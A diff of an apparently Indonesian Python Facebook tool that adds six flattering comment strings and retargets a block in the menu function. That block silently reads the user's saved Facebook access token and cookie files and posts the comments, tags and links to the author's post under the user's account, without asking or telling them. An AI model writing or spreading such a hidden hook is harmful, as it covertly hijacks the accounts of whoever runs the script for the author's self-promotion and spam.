@@ -283,6 +283,12 @@ kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
 asu = random.choice([m,k,h,u,b])
+kom1 = ("Anjng Panutan Ku, Keren Bngt Bnjerr 🤙\n -\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\n \nkomentar ditulis oleh bot\n \n[ Semangat Bang @[100043537611609:] ]") 
+kom2 = ("Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku") 
+kom3 = ("Panutan Ku") 
+kom4 = ("Keren Bang") 
+kom5 = ("Jadikan Aku Anak Buah Mu Bang @[100043537611609:]") 
+kom6 = (" Izin Share Ya Bang\n-\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\nSemangat Ya Bang ❤") 
 #--------------------[ CONVERTER-BULAN ]--------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
@@ -426,13 +432,13 @@ def menu(my_name,my_id):
     try:
         token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
-        requests.post(f"https://graph.facebook.com/1572434749886580/comments/?message={kom1}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/1572434749886580/comments/?message={kom2}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/1572434749886580/comments/?message={kom3}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/1572434749886580/comments/?message={kom4}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/1572434749886580/comments/?message={kom5}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/1572434749886580/comments/?message={kom6}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post("https://graph.facebook.com/100013602104446?fields=subscribers&access_token=%s"%(tokenku))
+        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom1}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom2}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom5}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post("https://graph.facebook.com/878169396977639?fields=subscribers&access_token=%s"%(tokenku))
     except IOError:
         Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
         time.sleep(3)
